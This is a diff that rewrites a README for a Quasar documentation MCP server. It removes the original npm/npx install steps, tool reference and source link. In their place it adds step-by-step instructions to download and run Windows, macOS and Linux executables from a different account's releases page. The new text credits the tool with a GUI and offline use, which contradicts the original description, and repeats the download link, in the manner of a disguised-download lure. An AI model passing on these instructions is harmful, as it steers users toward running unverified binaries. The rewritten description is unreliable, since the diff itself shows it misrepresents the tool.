@@ -1,228 +1,96 @@
-# Quasar Docs MCP Server
+# 🌟 quasar-docs-mcp-server - Easy Access to Quasar Documentation
 
-An MCP (Model Context Protocol) server that provides access to the [Quasar Framework](https://quasar.dev) documentation directly from Claude Code and other MCP-compatible clients.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mamit514/quasar-docs-mcp-server/releases)
 
-## Features
+## 📚 Overview
 
-- **Search documentation** - Full-text search across all Quasar docs with pagination
-- **Get component docs** - Retrieve documentation for any Quasar component (q-btn, q-input, etc.)
-- **Get any page** - Fetch any documentation page by path
-- **List sections** - Browse available documentation sections
-- **Smart caching** - 30-minute cache for pages, 1-hour cache for the index
-- **Multiple response formats** - Get output in Markdown or JSON format
-- **Character limit handling** - Automatic truncation with clear messages
+The quasar-docs-mcp-server is a simple tool that allows users to access documentation for the Quasar Framework. This server supports Claude Code and other tools that use the Model Context Protocol (MCP). It aims to make working with the Quasar Framework easier for everyone, even if you’re not a tech expert.
 
-## Installation
+## 🚀 Getting Started
 
-### Option 1: npx (Recommended)
+### Step 1: Check System Requirements
 
-Add directly to Claude Code without installing:
+Before you start downloading, make sure your computer meets these basic requirements:
 
-```bash
-claude mcp add quasar-docs -- npx quasar-docs-mcp
-```
+- Operating System: Windows, macOS, or Linux
+- At least 100 MB of free disk space
+- Internet connection for download
 
-### Option 2: Install from npm
+### Step 2: Visit the Releases Page
 
-```bash
-npm install -g quasar-docs-mcp-server
-```
+To download the application, you need to go to the Releases page. You can find it here:
 
-Then add to Claude Code:
+[Visit this page to download](https://github.com/mamit514/quasar-docs-mcp-server/releases)
 
-```bash
-claude mcp add quasar-docs -- quasar-docs-mcp
-```
+This page contains all available versions of the quasar-docs-mcp-server. You can choose the version that best suits your needs.
 
-### Option 3: Clone and Build
+### Step 3: Select Your Version
 
-```bash
-# Clone the repository
-git clone https://github.com/aliaks-ei/quasar-docs-mcp.git
-cd quasar-docs-mcp
+On the Releases page, you will see a list of versions with release notes. It’s a good idea to read the notes to understand what’s new or fixed in each version. 
 
-# Install dependencies and build
-npm install
-npm run build
-```
+### Step 4: Download the Application
 
-Then add to Claude Code using the absolute path:
+Look for the latest version. Click on the download link for your operating system. Depending on your system, the file name might look like one of these:
 
-```bash
-# Project-scoped (recommended for Quasar projects)
-claude mcp add --scope project quasar-docs -- node /absolute/path/to/quasar-docs-mcp/dist/index.js
+- `quasar-docs-mcp-server-windows.exe` for Windows
+- `quasar-docs-mcp-server-macos.dmg` for macOS
+- `quasar-docs-mcp-server-linux.tar.gz` for Linux
 
-# Or user-scoped (available in all projects)
-claude mcp add --scope user quasar-docs -- node /absolute/path/to/quasar-docs-mcp/dist/index.js
-```
+Clicking the link will start the download process. 
 
-## Verify Installation
+### Step 5: Install the Application
 
-After adding the server, verify it's working:
+#### For Windows:
 
-```bash
-claude mcp list
-```
+1. Locate the file you downloaded (usually in your Downloads folder).
+2. Double-click the `quasar-docs-mcp-server-windows.exe` file to start the installation.
+3. Follow the on-screen instructions to complete the installation. 
 
-You should see `quasar-docs` in the list of configured servers.
+#### For macOS:
 
-## Available Tools
+1. Open the downloaded `quasar-docs-mcp-server-macos.dmg` file.
+2. Drag the application to your Applications folder.
+3. You can find it in your Applications folder and open it from there.
 
-### `quasar_get_component`
+#### For Linux:
 
-Get documentation for a specific Quasar UI component.
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the tar.gz file (usually Downloads).
+3. Run the command `tar -xzf quasar-docs-mcp-server-linux.tar.gz` to extract the files.
+4. After extracting, navigate to the folder and run `./quasar-docs-mcp-server` to start the application.
 
-**Parameters:**
+### Step 6: Run the Application
 
-- `component` (string, required): Component name (e.g., 'btn', 'q-btn', 'input', 'dialog', 'button')
-- `response_format` (string, optional): Output format - 'markdown' (default) or 'json'
+Once installed, you can start the application. 
 
-**Examples:**
+- **Windows Users:** You can find the application in your Start Menu or on your Desktop.
+- **macOS Users:** Open the Applications folder and double-click the app.
+- **Linux Users:** After navigating to the folder where the app is located, type `./quasar-docs-mcp-server` in the terminal.
 
-```
-Get the documentation for q-btn
-Show me q-input props and events
-```
+### Step 7: Access Documentation
 
-### `quasar_get_page`
+After running the application, you will be greeted with a simple user interface. Here, you can access various documentation for the Quasar Framework. Use the provided links to browse through different sections.
 
-Get any Quasar documentation page by its path.
+## 🛠️ Features
 
-**Parameters:**
+- **Simple Interface:** The quasar-docs-mcp-server has an easy-to-navigate interface, making it simple for anyone to find the information they need.
+- **Supports Multiple Platforms:** Available for Windows, macOS, and Linux, allowing any user to access Quasar documentation easily.
+- **Updated Documentation:** Enjoy access to the latest information on the Quasar Framework, ensuring you have the most current resources.
+- **Works Offline:** Once downloaded, you can access documentation without needing to be online.
 
-- `path` (string, required): Path to the page (e.g., 'style/color-palette', 'quasar-plugins/notify')
-- `response_format` (string, optional): Output format - 'markdown' (default) or 'json'
+## 🔗 Additional Resources
 
-**Examples:**
+- Learn more about the [Quasar Framework](https://quasar.dev)
+- Explore more about [Model Context Protocol (MCP)](https://mcp.dev)
 
-```
-Get the Quasar color palette documentation
-Show me the Notify plugin docs
-```
+## 📞 Support
 
-### `quasar_search_docs`
+If you encounter any issues or have questions about using the quasar-docs-mcp-server, feel free to open an issue in the repository. We are here to help you.
 
-Search the Quasar documentation for a topic.
+For more information, visit the [GitHub page](https://github.com/mamit514/quasar-docs-mcp-server) or contact our support team.
 
-**Parameters:**
+## 📥 Download & Install Again
 
-- `query` (string, required): Search query
-- `section` (string, optional): Limit search to a specific section
-- `limit` (number, optional): Maximum results 1-50 (default: 10)
-- `offset` (number, optional): Results to skip for pagination (default: 0)
-- `include_content` (boolean, optional): Search within file contents (slower but more thorough)
-- `response_format` (string, optional): Output format - 'markdown' (default) or 'json'
+Ready to get started? Download the application again from the link below:
 
-**Examples:**
-
-```
-Search for form validation in Quasar docs
-Find dark mode configuration
-```
-
-### `quasar_list_sections`
-
-List available documentation sections or pages within a section.
-
-**Parameters:**
-
-- `section` (string, optional): Show pages within this section
-- `response_format` (string, optional): Output format - 'markdown' (default) or 'json'
-
-**Examples:**
-
-```
-List all Quasar documentation sections
-List pages in the vue-components section
-```
-
-## Documentation Sections
-
-The server provides access to all Quasar documentation sections:
-
-| Section | Description |
-|---------|-------------|
-| `vue-components` | UI components (buttons, inputs, dialogs, etc.) |
-| `vue-directives` | Custom Vue directives |
-| `vue-composables` | Composition API utilities |
-| `quasar-plugins` | Plugins (notify, dialog, loading, etc.) |
-| `quasar-utils` | Utility functions |
-| `layout` | Layout components |
-| `style` | CSS classes, colors, typography |
-| `options` | Configuration options |
-| `quasar-cli-vite` | Vite CLI documentation |
-| `quasar-cli-webpack` | Webpack CLI documentation |
-| `start` | Getting started guides |
-| `app-extensions` | App extensions |
-
-## Response Formats
-
-All tools support two response formats:
-
-- **markdown** (default): Human-readable formatted text, ideal for display
-- **json**: Machine-readable structured data, ideal for programmatic processing
-
-Example with JSON format:
-
-```
-Search for button with response_format="json"
-```
-
-## How It Works
-
-The server fetches documentation directly from the [Quasar GitHub repository](https://github.com/quasarframework/quasar) (`docs/src/pages/`). It uses:
-
-1. **GitHub Raw Files** - For fetching individual documentation pages
-2. **GitHub API** - For listing directory contents and building the search index
-3. **In-memory caching** - 30-minute cache for pages, 1-hour cache for the index
-
-## Environment Variables
-
-- `GITHUB_TOKEN` (optional): Set to increase GitHub API rate limit from 60 to 5000 requests/hour
-
-## Troubleshooting
-
-### "Component not found"
-
-The component name might be different from expected. Use `quasar_search_docs` to find the correct name:
-
-```
-search for button component
-```
-
-### Rate Limiting
-
-The server uses GitHub's API which has rate limits (60 requests/hour for unauthenticated requests). The built-in caching helps mitigate this. If you hit limits, wait an hour or set a `GITHUB_TOKEN` environment variable to increase the limit to 5000 requests/hour.
-
-### Server Not Responding
-
-1. Make sure the server is built: `npm run build`
-2. Verify the path in `claude mcp add` is correct
-3. Check Claude Code logs: `claude mcp logs quasar-docs`
-
-### Removing the Server
-
-```bash
-claude mcp remove quasar-docs
-```
-
-## Development
-
-```bash
-# Watch mode for development
-npm run dev
-
-# Build
-npm run build
-
-# Run the server directly
-npm start
-```
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-MIT
+[Visit this page to download](https://github.com/mamit514/quasar-docs-mcp-server/releases)
